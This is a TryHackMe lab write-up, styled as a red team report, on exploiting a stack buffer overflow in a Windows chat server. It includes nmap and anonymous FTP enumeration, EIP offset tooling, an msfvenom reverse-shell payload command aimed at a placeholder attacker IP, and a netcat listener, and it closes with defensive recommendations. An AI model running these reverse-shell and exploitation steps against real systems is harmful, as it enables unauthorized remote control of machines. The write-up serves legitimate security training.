# Red Team Engagement Report – Brainstorm  

**Windows Buffer Overflow Exploitation**

**Author:** Omar Taisir Abu Zahra  
**Lab Name:** Brainstorm  
**Platform:** TryHackMe (Lab Environment)  
**Engagement Type:** Red Team / Exploit Development  
**Assessed Difficulty:** Medium  
**Final Outcome:** Full system compromise (SYSTEM privileges)  
**Date:** March 2026  

---

## Executive Summary

This engagement simulated a targeted attack against a Windows-based system hosting a custom chat application. The objective was to identify vulnerabilities and achieve full system compromise.

The attack began with network enumeration, followed by discovery of exposed FTP services containing application binaries. Reverse engineering revealed a **stack-based buffer overflow vulnerability** in the chat server application.

By exploiting this vulnerability, the attacker achieved **remote code execution**, resulting in a reverse shell with elevated privileges.

---

## Scope & Objectives

### Scope
- Target Windows host  
- Exposed services (FTP, RDP, custom application)  
- Application binaries  

### Objectives
- Perform network enumeration  
- Identify vulnerable services  
- Exploit application vulnerability  
- Gain system-level access  

---

## Attack Path Overview

Network Enumeration  
→ FTP Access (Anonymous Login)  
→ Binary Extraction  
→ Reverse Engineering  
→ Buffer Overflow Discovery  
→ Exploit Development  
→ Remote Code Execution  
→ SYSTEM Access  

---

## Phase 1 – Network Enumeration  

### Objective  
Identify exposed services and attack surface.

```bash
nmap -T4 -p- -Pn 10.10.10.10
Findings
FTP service exposed
RDP service exposed
Unknown service running on port 9999
```
## Phase 2 – FTP Enumeration
```bash
Objective

Access publicly available resources.

ftp 10.10.10.10
Findings
Anonymous login allowed
Directory discovered containing application files
Downloaded executable and supporting DLL

Key Insight: Application binaries were publicly accessible
```
## Phase 3 – Service Interaction
```bash
Objective

Understand behavior of the custom service.

nc 10.10.10.10 9999
Observations
Prompts for username
Accepts message input
Acts as a simple chat application
```
## Phase 4 – Vulnerability Discovery
```bash
Objective

Identify exploitable weaknesses.

Reverse engineering revealed:

Unsafe memory handling
Lack of input validation
Potential stack-based buffer overflow

Impact: User-controlled input can overwrite memory structures
```
## Phase 5 – Exploit Development
```bash
Objective

Achieve control over program execution.

Fuzzing
Large inputs caused application crash
Confirms presence of overflow vulnerability
EIP Offset Calculation
msf-pattern_create -l 5000
msf-pattern_offset -q <value>
Offset identified (value intentionally omitted)
EIP Control
"A" * <offset> + "BBBB"
Instruction pointer successfully controlled
```
## Phase 6 – Bypass Protections
```bash
Objective

Identify reliable execution redirection.

Analysis of the DLL revealed:

Memory protections not fully enabled
Suitable instruction for redirecting execution located
```
## Phase 7 – Payload Generation
```bash
Objective

Generate shellcode for remote execution.

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=9001 -b "\x00" -f c
Payload Structure
[Padding]
[Return Address]
[NOP sled]
[Shellcode]
[Padding]
```
## Phase 8 – Exploitation
```bash
Objective

Gain remote shell access.

nc -lnvp 9001
Exploit delivered successfully
Reverse shell established
```
## Phase 9 – Post-Exploitation
```bash
Objective

Validate access and retrieve sensitive data.

whoami
Result
Elevated privileges confirmed
Data Access
Navigated through user directories
Located sensitive file on desktop
Impact Validation
System-Level Compromise Confirmed
Full administrative control
Ability to execute arbitrary commands
Access to sensitive system files
```
## Risk Assessment

Overall Risk Rating: Critical

Key Issues Identified
Anonymous FTP access
Exposure of sensitive binaries
Insecure coding practices
Lack of exploit mitigations
Defensive Recommendations
Disable anonymous FTP access
Restrict access to application binaries
Replace unsafe functions with secure alternatives
Enable ASLR and DEP protections
Implement strict input validation
Conduct regular security code reviews
## MITRE ATT&CK Mapping
| Tactic               | Technique                             | ID    |
| -------------------- | ------------------------------------- | ----- |
| Reconnaissance       | Active Scanning                       | T1595 |
| Initial Access       | Exploit Public-Facing Application     | T1190 |
| Discovery            | Service Discovery                     | T1046 |
| Execution            | Exploitation for Client Execution     | T1203 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Command & Control    | Reverse Shell                         | T1071 |

## Conclusion

This engagement demonstrates how insecure application development combined with exposed services can lead to full system compromise.

The ability to download binaries, reverse engineer them, and exploit a buffer overflow vulnerability highlights the importance of secure coding practices and proper system hardening.

Even without advanced techniques, an attacker can gain complete control when foundational security controls are missing.